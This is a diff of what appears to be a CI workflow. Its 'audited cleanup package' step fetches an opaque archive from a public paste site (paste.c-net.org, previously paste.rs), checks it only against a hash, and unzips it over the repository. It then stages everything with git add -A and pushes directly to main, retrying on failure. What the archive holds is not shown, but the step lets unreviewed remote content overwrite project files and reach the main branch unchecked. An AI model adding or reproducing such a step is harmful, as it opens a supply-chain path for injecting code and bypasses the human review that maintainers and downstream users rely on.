@@ -25,42 +25,21 @@ jobs:
       - name: Apply audited cleanup package
         run: |
           set -euo pipefail
-          python - <<'PY'
-          from pathlib import Path
-          import hashlib, io, traceback, urllib.request, zipfile
-          marker = Path(".cleanup-diagnostic.txt")
-          try:
-              marker.write_text("stage=download\n", encoding="utf-8")
-              payload = urllib.request.urlopen("https://paste.rs/Sffu3", timeout=30).read()
-              marker.write_text(f"stage=downloaded bytes={len(payload)}\n", encoding="utf-8")
-              actual = hashlib.sha256(payload).hexdigest()
-              expected = "1d5e8cb1bb191389e398ff18b9528e56e0fede47b6f279b281e229d130f60774"
-              if actual != expected:
-                  raise RuntimeError(f"payload sha mismatch: {actual}")
-              marker.write_text("stage=extract\n", encoding="utf-8")
-              zipfile.ZipFile(io.BytesIO(payload)).extractall(".")
-              for rel in ("_data/feed_cache.json", "_data/feed_health.json"):
-                  Path(rel).unlink(missing_ok=True)
-              marker.unlink(missing_ok=True)
-          except Exception:
-              marker.write_text("stage=error\n" + traceback.format_exc(), encoding="utf-8")
-              raise
-          PY
+          curl -L --fail --silent --show-error https://paste.c-net.org/MichiganCongress -o /tmp/final-cleanup.b64
+          echo "568e18615f216626d301b4286d7755991a3c9b5b2b0162250ebcf5ffd2a885d3  /tmp/final-cleanup.b64" | sha256sum --check
+          base64 --decode /tmp/final-cleanup.b64 > /tmp/final-cleanup.zip
+          echo "1d5e8cb1bb191389e398ff18b9528e56e0fede47b6f279b281e229d130f60774  /tmp/final-cleanup.zip" | sha256sum --check
+          unzip -oq /tmp/final-cleanup.zip -d .
+          rm -f _data/feed_cache.json _data/feed_health.json .cleanup-diagnostic.txt
           git config user.name "Wild Brief Bot"
           git config user.email "bot@wildbrief.com"
           git add -A
           git commit -m "audit: remove remaining non-animal legacy"
-          git push origin HEAD:main
-      - name: Publish diagnostic marker
-        if: failure()
-        run: |
-          git config user.name "Wild Brief Bot"
-          git config user.email "bot@wildbrief.com"
-          if [ ! -f .cleanup-diagnostic.txt ]; then
-            echo "stage=shell-or-push-failure" > .cleanup-diagnostic.txt
-          fi
-          git reset
-          git add .cleanup-diagnostic.txt
-          git commit -m "chore: capture temporary cleanup diagnostic" || true
-          git pull --rebase --autostash origin main || true
-          git push origin HEAD:main || true
+          for attempt in 1 2 3; do
+            if git push origin HEAD:main; then
+              exit 0
+            fi
+            git pull --rebase --autostash origin main
+            sleep $((attempt * 3))
+          done
+          exit 1
